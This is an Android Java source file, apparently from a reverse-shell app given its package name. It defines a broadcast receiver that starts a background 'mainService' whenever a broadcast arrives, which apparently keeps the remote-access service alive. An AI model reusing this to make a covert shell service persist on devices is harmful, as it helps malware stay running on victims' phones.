package com.example.reverseshell2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import androidx.core.content.ContextCompat;

public class broadcastReciever extends BroadcastReceiver {

    static String TAG = "broadcastRecieverClass";
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i(TAG, "Received...");

        Intent intent1 = new Intent(context, mainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(context, intent1);
        } else {
            context.startService(intent1);
        }
    }
}
